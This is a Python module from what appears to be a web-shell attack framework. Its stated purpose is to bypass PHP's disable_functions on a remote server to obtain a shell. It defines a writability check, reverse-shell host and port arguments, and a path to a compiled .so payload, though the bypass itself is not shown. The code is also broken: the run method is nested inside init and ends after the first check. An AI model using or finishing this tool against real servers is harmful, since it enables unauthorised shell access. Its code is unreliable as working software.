from core.vectors import PhpCode, ShellCmd
from core.module import Module
import os


class Disablefunctionbypass2(Module):

  #####################################################
  # The one line description of the module is saved
  # as python docstring.

  """It provides a way to bypass disable_functions in order to get a shell"""


  def init(self):

    #######################################################
    # Store a dictionary with the module basic information
    # using `register_info`. Arbitrary fields can be added.

    self.register_info(
      {
      'author': [
         'Titouan Lazard'
      ],
         'license': 'GPLv3'
      }
    )



    self.register_vectors(
      [
        PhpCode(
          payload = """(is_writable(${path})&&print(1)||print(0));""",
          postprocess =  lambda x: x == '1',
          name = "check"
        )
      ]
    )



    self.register_arguments(
      [
        {
          'name' : '--path',
          'help' : 'file to a writable directory in the remote server',
          'default' : "."
        },
        {
          'name' : '--lport',
          'help' : 'Local port to create a reverse shell if standart payload is used',
          'default' : "443"
        },
        {
          'name' : '--lhost',
          'help' : 'Local host to create a reverse shell if standart payload is used',
          'default' : "127.0.0.1"
        },
        {
          'name' : '--payload',
          'help' : 'Path to the .so to use',
          'default' : os.path.join(self.folder, 'basicpayload.so')
        }
      ]
    )

    def run(self):
        if not self.vectors.get_result('check'):
            return
